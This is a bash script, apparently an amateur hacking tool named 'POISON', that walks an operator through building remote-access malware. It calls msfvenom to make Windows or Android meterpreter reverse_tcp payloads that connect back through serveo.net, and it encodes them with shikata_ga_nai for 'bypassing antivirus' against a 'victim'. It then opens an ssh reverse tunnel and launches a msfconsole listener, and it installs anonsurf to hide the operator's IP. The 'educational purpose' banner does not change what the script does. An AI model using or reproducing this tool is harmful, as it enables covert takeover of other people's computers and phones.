#!/bin/bash
clear
clr2eol=`tput el`                              
echo -n  "      __               , _    
       /\_\/o    ()     /|/ \   
   _  |    |     /\  __  |   |  
 |/ \_|    ||   /  \/  \_|   |  
 |__/  \__/ |_//(__/\__/ |   |_/
/|                              
\|   The Simple WAN Payload Generator for Noobs by a Noob"
sleep 3
echo -n -e "\r${clr2eol}////////////******SCRIPT BY******//////////"
sleep 3
echo -n -e "\r${clr2eol}////////////******MITESH WANI*******/////// "
sleep 3
echo -n -e "\r${clr2eol}////////////******DEVELOPED FOR*******/////// "
sleep 2
echo -n -e "\r${clr2eol}////////////******EDUCATIONAL PURPOSE******////// "
sleep 2
echo -n -e "\r${clr2eol}////////////******FOR ANY ISSUES AND REPORTS******///// "
sleep 3
echo -n -e "\r${clr2eol}///////////********VISIT GITHUB.COM/MITESHW05/POISON********//////"
sleep 4
ACTUAL="THERE WE ARE"
read pass
if [ "$pass" != "$ACTUAL" ]
 then 
 echo "Sorry!! Please check the password again or else contact me on pOiSoN0000123@protonmail.com"
 exit 
 else
 echo "Amazing, Password is correct!!!!"
fi
sleep 3
echo -n -e "\r${clr2eol}///////////********CHECKING FOR FILES********//////"
sleep 2
 if [ -d "ngrok-linux-stable-amd64" ]
then
echo "ngrok installed OK!!!(JUST CLOSE THE NEWLY OPENED TERMINAL)"
else
echo "ngrok is not installed , (This Will not affect the script now , but the upcoming feature (port forwarding using ngrok) will not work)(JUST CLOSE THE NEWLY OPENED TERMINAL)"
fi
echo -n -e "\r${clr2eol}//////////*********STARTING***********///////// "
sleep 1
echo -n -e "\r${clr2eol}**************\n  "
sleep 1
echo -n -e "\r${clr2eol}*********************************\n "
sleep 1
echo -n -e "\r${clr2eol}***********************************************************\n "
sleep 1
echo -n -e "\r${clr2eol}****************************************************************************\n "
sleep 1
echo -n -e "\r${clr2eol}************************************************************************************************ \n"
sleep 1
echo -n -e "\r${clr2eol}************************************************************************************************************ \n"
sleep 1
echo -n -e "\r${clr2eol}***************************************************************************************************************************** \n"
sleep 1
while true; do
  echo -e "\n\t\t\t1.Build The Virus!!!\n\t\t\t2.Start Port Forwarding\n\t\t\t3.Start Listening\n\t\t\t4.IP Tools"
 read s
 case $s in 
	[1]* )
echo -e "\tGive me the victim operating system\n\t\t1.windows\n\t\t2.android"
read t
echo -e "\tGive me the listening port(lport)"
read p
echo -e "\tWhat should be the name of your file??"
read n
name=$1
set 'who am i'
while true; do
    echo -e "\tWanna Encode File(For Bypassing Antivirus)??\n\t\t1.Yess Please\n\t\t2.Naah!! I don't worry" 
   read y
    case $y in
        [1]* ) 
if [ $t -eq 2 ]
 then
 o='android'
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p -e x86/shikata_ga_nai -i 2000 lport=$p -o /root/Desktop/$n.apk
else 
 o='windows'
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p -e x86/shikata_ga_nai -i 2000  -o /root/Desktop/$n.exe
fi; break;;
        [2]* ) 
if [ $t -eq 2 ]
 then
 o='android'
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p -o /root/Desktop/$n.apk
else 
 o='windows'
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p  -o /root/Desktop/$n.exe
fi; break;;
        * ) echo "Please answer 1 or 2";;
    esac
done

echo -e "\t\t\tDone!!! Check your Desktop for file HAPPY HACKING@@@"
while true; do
    read -p "Wanna Start Port Forwarding(y/n) " g
    case $g in
        [Yy]* ) echo -e "\n\tWell a good Choice , Wait for a moment"
		gnome-terminal -- ssh -R $p:localhost:$p serveo.net
		echo -e "\n\t\tDone, check the new terminal for details"; break;;
        [Nn]* ) exit;;
        * ) echo "Please answer yes or no.";;
    esac
done
while true; do
    read -p "Wanna Start Listening(y/n) " yn
    case $yn in
        [Yy]* )
	gnome-terminal -- msfconsole -x "use multi/handler;set payload $o/meterpreter/reverse_tcp;set lhost serveo.net;set lport $p;exploit"
	echo "Thanks For using the script!!!"
	sleep 5; break;;
        [Nn]* ) exit;;
        * ) echo "Please answer yes or no.";;
    esac
done; break;;
  	[2]* )
	echo "Give me the port no."
	read p
	ssh -R $p:localhost:$p serveo.net
	echo -e "\nDONE!!!"; break;;
	[3]* )
	echo "Give me the port no."
	read p
	echo "Select the operating system(windows/android)"
	read o 
	msfconsole -x "use multi/handler;set payload $o/meterpreter/reverse_tcp;set lhost serveo.net;set lport $p;exploit"; break;;
	[4]* )
	clear
	while true; do
  echo -e "\n\t\t 1.What's My IP\n\t\t2.Hide My IP\n\t\t3.UnHide My  IP"
 read i
 case $i in 
	[1]* )
	echo "Well So Let me check your IP......."
	sleep 2
 	echo -e "\nOkay so your IP is" 
	wget  http://ip-api.com/json
	cat json
	sleep 10
	rm json; break;;
	[2]* )
	echo -e "\nOKAY HIDING YOUR IP...(it will work only when nipe is installed (if not installed , just install it)"
	cd
	if [ -d "kali-anonsurf" ] 
	then
	echo "Ok anonsurf is installed"
	else
	echo "Anonsurf is not installed , installing now"
	sleep 2
	git clone https://github.com/Und3rf10w/kali-anonsurf
	cd kali-anonsurf
	./installer.sh
	fi
	anonsurf start
	anonsurf status
	cd
	cd poison;
	 break;;
	[3]* )
	echo -e "\nOKAY UNHIDING YOUR IP...(it will work only when nipe is installed (if not installed , just install it)"
	cd
	if [ -d "kali-anonsurf" ] 
	then
	echo "Ok anonsurf is installed"
	else
	echo "Anonsurf is not installed , installing now"
	sleep 2
	cd
	git clone https://github.com/Und3rf10w/kali-anonsurf
	cd kali-anonsurf
	./installer.sh
	fi
	anonsurf stop
	anonsurf status
	cd
	cd poison;
	 break;;  
	* ) echo "Please Select Correct option"; break;;
    esac
done; break;;
esac 
done 

